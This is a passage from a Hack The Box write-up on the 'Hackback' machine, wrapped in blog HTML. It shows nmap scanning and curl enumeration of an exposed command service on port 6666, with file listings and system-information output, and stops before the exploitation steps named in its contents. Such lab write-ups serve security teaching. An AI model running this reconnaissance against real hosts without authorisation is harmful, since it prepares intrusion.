<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Hackback - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Hackback from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Hackback">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/hackback/">


  <meta property="og:description" content="My write-up / walkthrough for Hackback from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Hackback">
  <meta name="twitter:description" content="My write-up / walkthrough for Hackback from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/hackback/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-07-06T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/hackback/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Hackback">
    <meta itemprop="description" content="Hack The Box - Hackback">
    <meta itemprop="datePublished" content="2019-07-06T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/hackback/" class="u-url" itemprop="url">Hack The Box - Hackback
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-07-06T07:00:00+02:00">July 6, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          22 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---hackback">Hack The Box - Hackback</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#http">HTTP</a></li>
<li><a href="#script-deobfuscation">Script Deobfuscation</a></li>
<li><a href="#accessing-the-secret-path">Accessing the Secret Path</a></li>
<li><a href="#gophish">Gophish</a></li>
<li><a href="#php-code-injection-uploading-tunnel">PHP Code Injection, Uploading Tunnel</a></li>
<li><a href="#running-the-proxy-server-shell-as-simple">Running the Proxy Server, Shell as simple</a></li>
<li><a href="#cleanini--shell-as-hacker">clean.ini , Shell as hacker</a></li>
<li><a href="#userlogger-filesystem-access-as-system-root-flag">UserLogger, Filesystem Access as System, Root Flag</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---hackback">Hack The Box - Hackback</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today Hackback retired and here’s my write-up about it. Hackback was a very hard machine full of different steps and rabbit holes. It’s a Windows machine and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.128</code>, I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">hackback.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/hackback/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with <code class="language-plaintext highlighter-rouge">nmap</code> to scan for open ports and services :
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC hackback.htb</code>
<br><img src="/images/hackthebox/hackback/1.png" alt="" class="align-center"><br><br>
We got two <code class="language-plaintext highlighter-rouge">http</code> ports, 80 and 6666, I also ran a full scan but we’ll get to that later.<br></p>

<h2 id="http">HTTP</h2>
<p>I checked both ports, on 80 there was this donkey image :
<br><img src="/images/hackthebox/hackback/2.png" alt="" class="align-center"><br><br>
I ran <code class="language-plaintext highlighter-rouge">gobuster</code> and it got nothing.<br>
I couldn’t send a request to port 6666 from the browser so I used curl :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/ 
"Missing Command!"
</code></pre></div></div>
<p>It says <code class="language-plaintext highlighter-rouge">"Missing Command!"</code>
So I tried <code class="language-plaintext highlighter-rouge">/help</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/help
"hello,proc,whoami,list,info,services,netsat,ipconfig"
</code></pre></div></div>
<p>It returned a list of what commands we can use. <code class="language-plaintext highlighter-rouge">/whoami</code> lists information about the user running this service, not really important. <code class="language-plaintext highlighter-rouge">/list</code> lists the files in the current directory :</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">root@kali:~/Desktop/HTB/boxes/hackback#</span><span class="w"> </span><span class="err">curl</span><span class="w"> </span><span class="err">http://hackback.htb:</span><span class="mi">6666</span><span class="err">/list</span><span class="w">
</span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Name"</span><span class="p">:</span><span class="w">  </span><span class="s2">"aspnet_client"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"length"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Name"</span><span class="p">:</span><span class="w">  </span><span class="s2">"default"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"length"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Name"</span><span class="p">:</span><span class="w">  </span><span class="s2">"new_phish"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"length"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Name"</span><span class="p">:</span><span class="w">  </span><span class="s2">"http.ps1"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Length"</span><span class="p">:</span><span class="w">  </span><span class="mi">1867</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Name"</span><span class="p">:</span><span class="w">  </span><span class="s2">"iisstart.htm"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Length"</span><span class="p">:</span><span class="w">  </span><span class="mi">703</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Name"</span><span class="p">:</span><span class="w">  </span><span class="s2">"iisstart.png"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Length"</span><span class="p">:</span><span class="w">  </span><span class="mi">99710</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">/info</code> prints system information, we might need that :</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">root@kali:~/Desktop/HTB/boxes/hackback#</span><span class="w"> </span><span class="err">curl</span><span class="w"> </span><span class="err">http://hackback.htb:</span><span class="mi">6666</span><span class="err">/info</span><span class="w">
</span><span class="p">{</span><span class="w">
    </span><span class="nl">"WindowsBuildLabEx"</span><span class="p">:</span><span class="w">  </span><span class="s2">"17763.1.amd64fre.rs5_release.180914-1434"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"WindowsCurrentVersion"</span><span class="p">:</span><span class="w">  </span><span class="s2">"6.3"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"WindowsEditionId"</span><span class="p">:</span><span class="w">  </span><span class="s2">"ServerStandard"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"WindowsInstallationType"</span><span class="p">:</span><span class="w">  </span><span class="s2">"Server"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"WindowsInstallDateFromRegistry"</span><span class="p">:</span><span class="w">  </span><span class="s2">"</span><span class="se">\/</span><span class="s2">Date(1542436874000)</span><span class="se">\/</span><span class="s2">"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"WindowsProductId"</span><span class="p">:</span><span class="w">  </span><span class="s2">"00429-00520-27817-AA520"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"WindowsProductName"</span><span class="p">:</span><span class="w">  </span><span class="s2">"Windows Server 2019 Standard"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"WindowsRegisteredOrganization"</span><span class="p">:</span><span class="w">  </span><span class="s2">""</span><span class="p">,</span><span class="w">
    </span><span class="nl">"WindowsRegisteredOwner"</span><span class="p">:</span><span class="w">  </span><span class="s2">"Windows User"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"WindowsSystemRoot"</span><span class="p">:</span><span class="w">  </span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"WindowsVersion"</span><span class="p">:</span><span class="w">  </span><span class="s2">"1809"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosCharacteristics"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosBIOSVersion"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosBuildNumber"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosCaption"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosCodeSet"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosCurrentLanguage"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosDescription"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosEmbeddedControllerMajorVersion"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosEmbeddedControllerMinorVersion"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosFirmwareType"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosIdentificationCode"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosInstallableLanguages"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosInstallDate"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosLanguageEdition"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosListOfLanguages"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosManufacturer"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosName"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosOtherTargetOS"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosPrimaryBIOS"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosReleaseDate"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosSeralNumber"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosSMBIOSBIOSVersion"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosSMBIOSMajorVersion"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosSMBIOSMinorVersion"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosSMBIOSPresent"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosSoftwareElementState"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosStatus"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosSystemBiosMajorVersion"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosSystemBiosMinorVersion"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosTargetOperatingSystem"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"BiosVersion"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsAdminPasswordStatus"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsAutomaticManagedPagefile"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsAutomaticResetBootOption"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsAutomaticResetCapability"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsBootOptionOnLimit"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsBootOptionOnWatchDog"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsBootROMSupported"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsBootStatus"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsBootupState"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsCaption"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsChassisBootupState"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsChassisSKUNumber"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsCurrentTimeZone"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsDaylightInEffect"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsDescription"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsDNSHostName"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsDomain"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsDomainRole"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsEnableDaylightSavingsTime"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsFrontPanelResetStatus"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsHypervisorPresent"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsInfraredSupported"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsInitialLoadInfo"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsInstallDate"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsKeyboardPasswordStatus"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsLastLoadInfo"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsManufacturer"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsModel"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsName"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsNetworkAdapters"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsNetworkServerModeEnabled"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsNumberOfLogicalProcessors"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsNumberOfProcessors"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsProcessors"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsOEMStringArray"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsPartOfDomain"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsPauseAfterReset"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsPCSystemType"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsPCSystemTypeEx"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsPowerManagementCapabilities"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsPowerManagementSupported"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsPowerOnPasswordStatus"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsPowerState"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsPowerSupplyState"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsPrimaryOwnerContact"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsPrimaryOwnerName"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsResetCapability"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsResetCount"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsResetLimit"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsRoles"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsStatus"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsSupportContactDescription"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsSystemFamily"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsSystemSKUNumber"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsSystemType"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsThermalState"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsTotalPhysicalMemory"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsPhyicallyInstalledMemory"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsUserName"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsWakeUpType"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"CsWorkgroup"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsName"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsType"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsOperatingSystemSKU"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsVersion"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsCSDVersion"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsBuildNumber"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsHotFixes"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsBootDevice"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsSystemDevice"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsSystemDirectory"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsSystemDrive"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsWindowsDirectory"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsCountryCode"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsCurrentTimeZone"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsLocaleID"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsLocale"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsLocalDateTime"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsLastBootUpTime"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsUptime"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsBuildType"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsCodeSet"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsDataExecutionPreventionAvailable"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsDataExecutionPrevention32BitApplications"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsDataExecutionPreventionDrivers"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsDataExecutionPreventionSupportPolicy"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
